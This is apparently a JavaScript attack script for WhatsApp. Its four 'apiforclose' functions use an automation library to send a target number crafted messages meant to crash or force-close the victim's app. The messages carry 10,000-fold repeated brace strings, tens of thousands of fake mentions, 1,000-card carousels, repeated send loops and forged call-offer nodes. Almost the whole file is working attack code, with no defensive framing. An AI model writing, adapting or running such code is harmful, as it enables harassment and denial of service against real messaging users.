const crypto = require("crypto");

async function apiforclose1(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'H',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "H"
                },
                footer: {
                  text: "H"
                },
                nativeFlowMessage: {
                  messageParamsJson: "}}}}}}}}}}".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "Pukimax",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await HamzxYzX.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(succes send)
}

async function apiforclose2(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "MatrixFamily",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: "ABCD",
                degreesLongitude: "ABCD",
                name: "ABCD",
                address: "ABCD",
              },
            },
            body: {
              text: "ABCD",
            },
            nativeFlowMessage: {
              messageParamsJson: "}}}}}}}}}}".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await HamzxYzX.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function apiforclose3(target) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }
  let callId = (await crypto.randomBytes(16)).toString("hex");
  let audio16000 = { tag: 'audio', attrs: { enc: 'opus', rate: '16000' } };
  let audio8000 = { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } };
  let net = { tag: 'net', attrs: { medium: '3' }, content: '3' };
  let capability = { tag: 'capability', attrs: { ver: '1' }, content: 'AAAAAA==' };
  let encopt = { tag: 'encopt', attrs: { keygen: '2' } };
  let offerContent = [audio16000, audio8000, net, capability, encopt];

  const generateRandomJids = (maxSize) => {
    const jids = [];
    let currentSize = 0;
    while (currentSize < maxSize - 25) {
      const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
      const target = `91${randomNumber}@s.whatsapp.net`;
      jids.push(target);
      currentSize += target.length + 3;
    }
    return jids;
  };

  const maxSize = 1074689;
  const jids = generateRandomJids(maxSize);

  try {

    for (let i = 0; i < 1000; i++) {
      
      await sleep(3000);
      let tmsg = await generateWAMessageFromContent(target, {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            stanzaId: HamzxYzXgenerateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "696969696969@s.whatsapp.net",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
            fromMe: false,
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "H",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"H\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                      version: 3
                    }
                  }
                }
              }
            }
          },
        },
      }, {});

      await HamzxYzX.relayMessage("status@broadcast", tmsg.message, {
        messageId: tmsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target },
              content: undefined,
            }],
          }],
        }],
      });

      let push = [];
      for (let i = 0; i < 1000; i++) {
        push.push({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: ``,
          }),
          footer: proto.Message.InteractiveMessage.Footer.fromObject({
            text: "",
          }),
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: '',
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "tcHyO7wrPPNctPRoi7x669hT8YEM0oB4Av25pSeG1cQ=",
              fileLength: "73384124",
              height: 1,
              width: 1,
              mediaKey: "/WtTeZEAvMxYIHa4hIrcGExALsiU3CKLMT3lqwNd8yk=",
              fileEncSha256: "BgKFWKbH4aeiME5GrSg/sinfE8Z96dX7Utm1OjmEXXM=",
              directPath: "/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&_nc_hot=1697385259",
              mediaKeyTimestamp: "1697384837",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAAvAAACAwEAAAAAAAAAAAAAAAAAAgEDBQQBAQEBAQEAAAAAAAAAAAAAAAABAgME/9oADAMBAAIQAxAAAADtfj6vRxsmprJBpaZueqDoJeLqz+/JmUWBpRXSJbDjDjsxjOtxsdzTMHqivfx1NoxgzxoyVbCKdDlhrXtw2zdsyxWqDvyrA4ogFaQhALf/xAAkEAACAgICAQQDAQAAAAAAAAAAAQIRAxIEMSEQExRRIzJCof/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            },
          }),
        });
      }

      tmsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.create({
                text: '\0',
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: '\n'.repeat(99),
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                hasMediaAttachment: false,
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: [...push],
              }),
            }),
          },
        },
      }, {});

      await HamzxYzX.relayMessage("status@broadcast", tmsg.message, {
        messageId: tmsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target },
              content: undefined,
            }],
          }],
        }],
      });
    }
    
      const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };
  
  const msg1 = generateWAMessageFromContent(target, message, {});
  
        await sock.relayMessage("status@broadcast", msg1.message, {
        messageId: msg1.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [
                {
                tag: 'offer',
                attrs: {
                'call-id': callId,
                'call-creator': '696969696969@s.whatsapp.net',
                'timestamp': Date.now().toString()
                },
              content: offerContent
            }],
          }],
        }],
      });
  
  } catch (error) {
    console.error(`Error in apiforclose3 for ${target}:`, error.message);
    throw error; 
  }
}

async function apiforclose4(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "H",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
               }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
              messageParamsJson: "}}}}}}}}}}".repeat(10000),
            },
          },
        },
      },
    };
    await HamzxYzX.relayMessage(xataWeb, message, {
      messageId: "",
      userJid: target
    });

    console.log(chalk.green("Success Send Forclose."));
  } catch (err) {
    console.error(chalk.red("Error: "), err.message);
  }
}  
